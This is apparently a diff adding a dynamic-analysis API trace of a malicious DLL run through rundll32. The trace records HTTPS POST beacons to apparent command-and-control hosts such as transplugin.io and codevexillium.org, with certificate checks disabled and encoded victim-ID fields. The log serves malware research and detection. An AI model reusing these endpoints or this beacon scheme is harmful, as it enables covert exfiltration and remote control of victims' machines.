+[PAR] LPCWSTR       lpszUsername   : 0x0 (null)
+[PAR] LPCWSTR       lpszPassword   : 0x0 (null)
+[PAR] DWORD         dwService      : 0x3 (INTERNET_SERVICE_HTTP)
+[PAR] DWORD         dwFlags        : 0x0 
+[RET] 0x1800029f1
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <HttpOpenRequestW> in [WININET.dll] 
+[PAR] HINTERNET hConnect           : 0xcc0008
+[PAR] LPCWSTR   lpszVerb           : 0x00000001800580D0 ("POST")
+[PAR] LPCWSTR   lpszObjectName     : 0x000000457D49D920
+[STR]           -> "/shop_testbr/upload/upload.php"
+[PAR] LPCWSTR   lpszVersion        : 0x00000001800580B8
+[STR]           -> "HTTP/1.0"
+[PAR] LPCWSTR   lpszReferer        : 0x0 (null)
+[PAR] LPCWSTR   *lplpszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags            : 0x803000 (INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID)
+[RET] 0x180002a44
+
+Thread created by monitored process : Now monitoring [pid 0xb68][tid 0xbf0]
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetSetOptionW> in [WININET.dll] 
+[PAR] HINTERNET hInternet      : 0xcc000c
+[PAR] DWORD     dwOption       : 0x1f (INTERNET_OPTION_SECURITY_FLAGS)
+[PAR] LPVOID    lpBuffer       : 0x000000457D49C2D4
+[PAR] DWORD     dwBufferLength : 0x4
+[RET] 0x180002a78
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <wsprintfW> in [USER32.dll] 
+[PAR] LPTSTR  lpOut : 0x000000457D49C740
+[PAR] LPCTSTR lpFmt : 0x00000001800580E0
+[STR]         -> "Content-Type: application/x-www-form-urlencoded"
+[RET] 0x180002a8c
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <HttpAddRequestHeadersW> in [WININET.dll] 
+[PAR] HINTERNET hRequest        : 0xcc000c
+[PAR] LPCWSTR   lpszHeaders     : 0x000000457D49C740
+[STR]           -> "Content-Type: application/x-www-form-urlencoded"
+[PAR] DWORD     dwHeadersLength : 0x2f
+[PAR] DWORD     dwModifiers     : 0x20000000 (HTTP_ADDREQ_FLAG_ADD)
+[RET] 0x180002abd
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <wsprintfW> in [USER32.dll] 
+[PAR] LPTSTR  lpOut : 0x000000457D49C740
+[PAR] LPCTSTR lpFmt : 0x0000000180058140
+[STR]         -> "Connection: Keep-Alive"
+[RET] 0x180002ad1
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <HttpAddRequestHeadersW> in [WININET.dll] 
+[PAR] HINTERNET hRequest        : 0xcc000c
+[PAR] LPCWSTR   lpszHeaders     : 0x000000457D49C740
+[STR]           -> "Connection: Keep-Alive"
+[PAR] DWORD     dwHeadersLength : 0x16
+[PAR] DWORD     dwModifiers     : 0x20000000 (HTTP_ADDREQ_FLAG_ADD)
+[RET] 0x180002b02
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <HttpSendRequestW> in [WININET.dll] 
+[PAR] HINTERNET hRequest         : 0xcc000c
+[PAR] LPCWSTR   lpszHeaders      : 0x0 (null)
+[PAR] DWORD     dwHeadersLength  : 0x0
+[PAR] LPVOID    lpOptional       : 0x000000457F180960
+[STR]           -> "PS=TQHIXD&ZJQTA=NDkwMThYOU8zSWRuQjJONw==&JAPH=&FAMLDX=0&NFOCNR=52&NOYMBN=MgAwADIANQAtADAAMwAtADAANAAgADIAMQA6ADMANwA6ADA"
+[STR]              "AOAA=&PRREFPA=RCU&ERP=PKCEJSR"
+[PAR] DWORD     dwOptionalLength : 0x95
+[RET] 0x18000314f
+
+Destruction de Processus, pid [0xb08] (C:\Windows\System32\SppExtComObj.Exe)
+
+Destruction de Processus, pid [0x94c] (C:\Windows\System32\sppsvc.exe)
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <Sleep> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0x64 (0 sec)
+[RET] 0x1800054ff
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <Sleep> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0xea60 (60 sec)
+[RET] 0x180005589
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[EVT] [Max Sleep]
+[MSG] Delay Execution reduced from 60000 ms to 10000 ms 
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <GetSystemTimeAsFileTime> in [KERNEL32.DLL] 
+[PAR] LPFILETIME lpSystemTimeAsFileTime : 0x000000457D49E220
+[RET] 0x180032734
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetCanonicalizeUrlW> in [WININET.dll] 
+[PAR] LPCWSTR lpszUrl          : 0x000000457D49F640
+[STR]         -> "https://transplugin.io/upload/upload.asp"
+[PAR] LPTSTR  lpszBuffer (out) : 0x000000457D49C740
+[PAR] LPDWORD lpdwBufferLength : 0x000000457D49C2D8
+[PAR] DWORD   dwFlags          : 0x3e000000
+[RET] 0x1800028a0
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetCrackUrlW> in [WININET.dll] 
+[PAR] LPCWSTR          lpszUrl	     : 0x000000457D49C740
+[STR]                  -> "https://transplugin.io/upload/upload.asp"
+[PAR] DWORD            dwUrlLength     : 0x28
+[PAR] DWORD            dwFlags         : 0x0
+[PAR] LPURL_COMPONENTS lpUrlComponents : 0x000000457D49C2E0
+[RET] 0x1800028cc
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <ObtainUserAgentString> in [urlmon.dll] 
+[PAR] DWORD  dwOption : 0x0
+[PAR] LPSTR  pszUAOut : 0x000000457D49C350
+[PAR] DWORD* cbSize   : 0x000000457D49C2DC
+[RET] 0x1800028fa
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x0 (CP_ACP)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D49C350
+[STR]        -> "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64; Trident/7.0; .NET4.0E; .NET4.0C)"
+[PAR] int    cbMultiByte    : 0xffffffff
+[PAR] LPWSTR lpWideCharStr  : 0x000000457D49D150
+[PAR] int    cchWideChar    : 0x5f
+[RET] 0x18000292f
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetOpenW> in [WININET.dll] 
+[PAR] LPCWSTR lpszAgent       : 0x000000457D49D150
+[STR]         -> "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64; Trident/7.0; .NET4.0E; .NET4.0C)"
+[PAR] DWORD   dwAccessType    : 0x0 (INTERNET_OPEN_TYPE_PRECONFIG)
+[PAR] LPCWSTR lpszProxyName   : 0x0 (null)
+[PAR] LPCWSTR lpszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0 
+[RET] 0x180002948
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetSetOptionW> in [WININET.dll] 
+[PAR] HINTERNET hInternet      : 0xcc0010
+[PAR] DWORD     dwOption       : 0x2 (INTERNET_OPTION_CONNECT_TIMEOUT)
+[PAR] LPVOID    lpBuffer       : 0x000000457D49C2D0
+[PAR] DWORD     dwBufferLength : 0x4
+[RET] 0x180002975
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetSetOptionW> in [WININET.dll] 
+[PAR] HINTERNET hInternet      : 0xcc0010
+[PAR] DWORD     dwOption       : 0x5 (INTERNET_OPTION_SEND_TIMEOUT)
+[PAR] LPVOID    lpBuffer       : 0x000000457D49C2D0
+[PAR] DWORD     dwBufferLength : 0x4
+[RET] 0x180002996
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetSetOptionW> in [WININET.dll] 
+[PAR] HINTERNET hInternet      : 0xcc0010
+[PAR] DWORD     dwOption       : 0x6 (INTERNET_OPTION_RECEIVE_TIMEOUT)
+[PAR] LPVOID    lpBuffer       : 0x000000457D49C2D0
+[PAR] DWORD     dwBufferLength : 0x4
+[RET] 0x1800029b7
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <DeleteUrlCacheEntryW> in [WININET.dll] 
+[PAR] LPCWSTR lpszUrlName : 0x000000457D49F640
+[STR]         -> "https://transplugin.io/upload/upload.asp"
+[RET] 0x1800029c0
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetConnectW> in [WININET.dll] 
+[PAR] HINTERNET     hInternet      : 0xcc0010
+[PAR] LPCWSTR       lpszServerName : 0x000000457D49CF40 ("transplugin.io")
+[PAR] INTERNET_PORT nServerPort    : 443
+[PAR] LPCWSTR       lpszUsername   : 0x0 (null)
+[PAR] LPCWSTR       lpszPassword   : 0x0 (null)
+[PAR] DWORD         dwService      : 0x3 (INTERNET_SERVICE_HTTP)
+[PAR] DWORD         dwFlags        : 0x0 
+[RET] 0x1800029f1
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <HttpOpenRequestW> in [WININET.dll] 
+[PAR] HINTERNET hConnect           : 0xcc0014
+[PAR] LPCWSTR   lpszVerb           : 0x00000001800580D0 ("POST")
+[PAR] LPCWSTR   lpszObjectName     : 0x000000457D49D920
+[STR]           -> "/upload/upload.asp"
+[PAR] LPCWSTR   lpszVersion        : 0x00000001800580B8
+[STR]           -> "HTTP/1.0"
+[PAR] LPCWSTR   lpszReferer        : 0x0 (null)
+[PAR] LPCWSTR   *lplpszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags            : 0x803000 (INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID)
+[RET] 0x180002a44
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetSetOptionW> in [WININET.dll] 
+[PAR] HINTERNET hInternet      : 0xcc0018
+[PAR] DWORD     dwOption       : 0x1f (INTERNET_OPTION_SECURITY_FLAGS)
+[PAR] LPVOID    lpBuffer       : 0x000000457D49C2D4
+[PAR] DWORD     dwBufferLength : 0x4
+[RET] 0x180002a78
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <wsprintfW> in [USER32.dll] 
+[PAR] LPTSTR  lpOut : 0x000000457D49C740
+[PAR] LPCTSTR lpFmt : 0x00000001800580E0
+[STR]         -> "Content-Type: application/x-www-form-urlencoded"
+[RET] 0x180002a8c
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <HttpAddRequestHeadersW> in [WININET.dll] 
+[PAR] HINTERNET hRequest        : 0xcc0018
+[PAR] LPCWSTR   lpszHeaders     : 0x000000457D49C740
+[STR]           -> "Content-Type: application/x-www-form-urlencoded"
+[PAR] DWORD     dwHeadersLength : 0x2f
+[PAR] DWORD     dwModifiers     : 0x20000000 (HTTP_ADDREQ_FLAG_ADD)
+[RET] 0x180002abd
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <wsprintfW> in [USER32.dll] 
+[PAR] LPTSTR  lpOut : 0x000000457D49C740
+[PAR] LPCTSTR lpFmt : 0x0000000180058140
+[STR]         -> "Connection: Keep-Alive"
+[RET] 0x180002ad1
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <HttpAddRequestHeadersW> in [WININET.dll] 
+[PAR] HINTERNET hRequest        : 0xcc0018
+[PAR] LPCWSTR   lpszHeaders     : 0x000000457D49C740
+[STR]           -> "Connection: Keep-Alive"
+[PAR] DWORD     dwHeadersLength : 0x16
+[PAR] DWORD     dwModifiers     : 0x20000000 (HTTP_ADDREQ_FLAG_ADD)
+[RET] 0x180002b02
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <HttpSendRequestW> in [WININET.dll] 
+[PAR] HINTERNET hRequest         : 0xcc0018
+[PAR] LPCWSTR   lpszHeaders      : 0x0 (null)
+[PAR] DWORD     dwHeadersLength  : 0x0
+[PAR] LPVOID    lpOptional       : 0x000000457F1868C0
+[STR]           -> "XW=EZYNQE&XOHTN=NDkwMThYOU8zSWRuQjJONw==&EWKK=&HIXXEE=0&HPYYJD=52&JTMDLK=MgAwADIANQAtADAAMwAtADAANAAgADIAMQA6ADMANwA6ADM"
+[STR]              "AOQA=&LSZRYMNDS=IPTDYCTZLUHNEJATJ&NONPECZ=FLOTMDRIMZIUQZZG"
+[PAR] DWORD     dwOptionalLength : 0xb2
+[RET] 0x18000314f
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <HttpQueryInfoA> in [WININET.dll] 
+[PAR] HINTERNET hRequest         : 0xcc0018
+[PAR] DWORD     dwInfoLevel      : 0x13 (WINHTTP_QUERY_STATUS_CODE)
+[PAR] LPVOID    lpvBuffer        : 0x000000457D49E0F0
+[PAR] LPDWORD   lpdwBufferLength : 0x000000457D49E0E8
+[FLD]           -> dwBufferLength = 0x105
+[PAR] DWORD     dwOptionalLength : 0x0
+[RET] 0x180002bc3
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetQueryDataAvailable> in [WININET.dll] 
+[PAR] HINTERNET hFile                    : 0xcc0018
+[PAR] LPCVOID   lpBuffer                 : 0x000000457D49E0E0
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0x0
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x0
+[RET] 0x180002bf0
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetReadFile> in [WININET.dll] 
+[PAR] HINTERNET hFile                 : 0xcc0018
+[PAR] LPVOID    lpBuffer              : 0x0000004580990080
+[PAR] DWORD     dwNumberOfBytesToRead : 0x5
+[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000457D49E0E4
+[RET] 0x180002c2e
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetQueryDataAvailable> in [WININET.dll] 
+[PAR] HINTERNET hFile                    : 0xcc0018
+[PAR] LPCVOID   lpBuffer                 : 0x000000457D49E0E0
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0x0
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x0
+[RET] 0x180002c52
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetCloseHandle> in [WININET.dll] 
+[PAR] HINTERNET  hInternet : 0xcc0010
+[RET] 0x180002746
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetCloseHandle> in [WININET.dll] 
+[PAR] HINTERNET  hInternet : 0xcc0014
+[RET] 0x180002763
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetCloseHandle> in [WININET.dll] 
+[PAR] HINTERNET  hInternet : 0xcc0018
+[RET] 0x180002780
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <GetSystemTimeAsFileTime> in [KERNEL32.DLL] 
+[PAR] LPFILETIME lpSystemTimeAsFileTime : 0x000000457D49E220
+[RET] 0x180032734
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <Sleep> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0x64 (0 sec)
+[RET] 0x1800054ff
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <Sleep> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0xea60 (60 sec)
+[RET] 0x180005589
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[EVT] [Max Sleep]
+[MSG] Delay Execution reduced from 60000 ms to 10000 ms 
+
+Destruction de Processus, pid [0x4c8] (C:\Windows\System32\wbem\WmiPrvSE.exe)
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <GetSystemTimeAsFileTime> in [KERNEL32.DLL] 
+[PAR] LPFILETIME lpSystemTimeAsFileTime : 0x000000457D49E220
+[RET] 0x180032734
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetCanonicalizeUrlW> in [WININET.dll] 
+[PAR] LPCWSTR lpszUrl          : 0x000000457D49F640
+[STR]         -> "https://codevexillium.org/image/download/download.asp"
+[PAR] LPTSTR  lpszBuffer (out) : 0x000000457D49C740
+[PAR] LPDWORD lpdwBufferLength : 0x000000457D49C2D8
+[PAR] DWORD   dwFlags          : 0x3e000000
+[RET] 0x1800028a0
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetCrackUrlW> in [WININET.dll] 
+[PAR] LPCWSTR          lpszUrl	     : 0x000000457D49C740
+[STR]                  -> "https://codevexillium.org/image/download/download.asp"
+[PAR] DWORD            dwUrlLength     : 0x35
+[PAR] DWORD            dwFlags         : 0x0
+[PAR] LPURL_COMPONENTS lpUrlComponents : 0x000000457D49C2E0
+[RET] 0x1800028cc
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <ObtainUserAgentString> in [urlmon.dll] 
+[PAR] DWORD  dwOption : 0x0
+[PAR] LPSTR  pszUAOut : 0x000000457D49C350
+[PAR] DWORD* cbSize   : 0x000000457D49C2DC
+[RET] 0x1800028fa
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x0 (CP_ACP)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D49C350
+[STR]        -> "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64; Trident/7.0; .NET4.0E; .NET4.0C)"
+[PAR] int    cbMultiByte    : 0xffffffff
+[PAR] LPWSTR lpWideCharStr  : 0x000000457D49D150
+[PAR] int    cchWideChar    : 0x5f
+[RET] 0x18000292f
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetOpenW> in [WININET.dll] 
+[PAR] LPCWSTR lpszAgent       : 0x000000457D49D150
+[STR]         -> "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64; Trident/7.0; .NET4.0E; .NET4.0C)"
+[PAR] DWORD   dwAccessType    : 0x0 (INTERNET_OPEN_TYPE_PRECONFIG)
+[PAR] LPCWSTR lpszProxyName   : 0x0 (null)
+[PAR] LPCWSTR lpszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0 
+[RET] 0x180002948
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetSetOptionW> in [WININET.dll] 
+[PAR] HINTERNET hInternet      : 0xcc0010
+[PAR] DWORD     dwOption       : 0x2 (INTERNET_OPTION_CONNECT_TIMEOUT)
+[PAR] LPVOID    lpBuffer       : 0x000000457D49C2D0
+[PAR] DWORD     dwBufferLength : 0x4
+[RET] 0x180002975
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetSetOptionW> in [WININET.dll] 
+[PAR] HINTERNET hInternet      : 0xcc0010
+[PAR] DWORD     dwOption       : 0x5 (INTERNET_OPTION_SEND_TIMEOUT)
+[PAR] LPVOID    lpBuffer       : 0x000000457D49C2D0
+[PAR] DWORD     dwBufferLength : 0x4
+[RET] 0x180002996
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetSetOptionW> in [WININET.dll] 
+[PAR] HINTERNET hInternet      : 0xcc0010
+[PAR] DWORD     dwOption       : 0x6 (INTERNET_OPTION_RECEIVE_TIMEOUT)
+[PAR] LPVOID    lpBuffer       : 0x000000457D49C2D0
+[PAR] DWORD     dwBufferLength : 0x4
+[RET] 0x1800029b7
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <DeleteUrlCacheEntryW> in [WININET.dll] 
+[PAR] LPCWSTR lpszUrlName : 0x000000457D49F640
+[STR]         -> "https://codevexillium.org/image/download/download.asp"
+[RET] 0x1800029c0
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetConnectW> in [WININET.dll] 
+[PAR] HINTERNET     hInternet      : 0xcc0010
+[PAR] LPCWSTR       lpszServerName : 0x000000457D49CF40 ("codevexillium.org")
+[PAR] INTERNET_PORT nServerPort    : 443
+[PAR] LPCWSTR       lpszUsername   : 0x0 (null)
+[PAR] LPCWSTR       lpszPassword   : 0x0 (null)
+[PAR] DWORD         dwService      : 0x3 (INTERNET_SERVICE_HTTP)
+[PAR] DWORD         dwFlags        : 0x0 
+[RET] 0x1800029f1
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <HttpOpenRequestW> in [WININET.dll] 
+[PAR] HINTERNET hConnect           : 0xcc0014
+[PAR] LPCWSTR   lpszVerb           : 0x00000001800580D0 ("POST")
+[PAR] LPCWSTR   lpszObjectName     : 0x000000457D49D920
+[STR]           -> "/image/download/download.asp"
+[PAR] LPCWSTR   lpszVersion        : 0x00000001800580B8
+[STR]           -> "HTTP/1.0"
+[PAR] LPCWSTR   lpszReferer        : 0x0 (null)
+[PAR] LPCWSTR   *lplpszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags            : 0x803000 (INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID)
+[RET] 0x180002a44
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetSetOptionW> in [WININET.dll] 
+[PAR] HINTERNET hInternet      : 0xcc0018
+[PAR] DWORD     dwOption       : 0x1f (INTERNET_OPTION_SECURITY_FLAGS)
+[PAR] LPVOID    lpBuffer       : 0x000000457D49C2D4
+[PAR] DWORD     dwBufferLength : 0x4
+[RET] 0x180002a78
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <wsprintfW> in [USER32.dll] 
+[PAR] LPTSTR  lpOut : 0x000000457D49C740
+[PAR] LPCTSTR lpFmt : 0x00000001800580E0
+[STR]         -> "Content-Type: application/x-www-form-urlencoded"
+[RET] 0x180002a8c
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <HttpAddRequestHeadersW> in [WININET.dll] 
+[PAR] HINTERNET hRequest        : 0xcc0018
+[PAR] LPCWSTR   lpszHeaders     : 0x000000457D49C740
+[STR]           -> "Content-Type: application/x-www-form-urlencoded"
+[PAR] DWORD     dwHeadersLength : 0x2f
+[PAR] DWORD     dwModifiers     : 0x20000000 (HTTP_ADDREQ_FLAG_ADD)
+[RET] 0x180002abd
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <wsprintfW> in [USER32.dll] 
+[PAR] LPTSTR  lpOut : 0x000000457D49C740
+[PAR] LPCTSTR lpFmt : 0x0000000180058140
+[STR]         -> "Connection: Keep-Alive"
+[RET] 0x180002ad1
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <HttpAddRequestHeadersW> in [WININET.dll] 
+[PAR] HINTERNET hRequest        : 0xcc0018
+[PAR] LPCWSTR   lpszHeaders     : 0x000000457D49C740
+[STR]           -> "Connection: Keep-Alive"
+[PAR] DWORD     dwHeadersLength : 0x16
+[PAR] DWORD     dwModifiers     : 0x20000000 (HTTP_ADDREQ_FLAG_ADD)
+[RET] 0x180002b02
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <HttpSendRequestW> in [WININET.dll] 
+[PAR] HINTERNET hRequest         : 0xcc0018
+[PAR] LPCWSTR   lpszHeaders      : 0x0 (null)
+[PAR] DWORD     dwHeadersLength  : 0x0
+[PAR] LPVOID    lpOptional       : 0x0000004580991B90
+[STR]           -> "OA=JYMNNQ&YFAWW=NDkwMThYOU8zSWRuQjJONw==&TMON=&IHWPFV=0&MROGBA=52&CGCYBH=MgAwADIANQAtADAAMwAtADAANAAgADIAMQA6ADMANwA6ADU"
+[STR]              "AMAA=&JTVVRC=IOBZUTLOFTPW&FHRATIXJA=DLAYYPZWKFI&VJISALPURJ=QRXKGWTL"
+[PAR] DWORD     dwOptionalLength : 0xbb
+[RET] 0x18000314f
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <Sleep> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0x64 (0 sec)
+[RET] 0x1800054ff
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <Sleep> in [KERNEL32.DLL] 
+[PAR] DWORD dwMilliseconds : 0xea60 (60 sec)
+[RET] 0x180005589
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[EVT] [Max Sleep]
+[MSG] Delay Execution reduced from 60000 ms to 10000 ms 
+
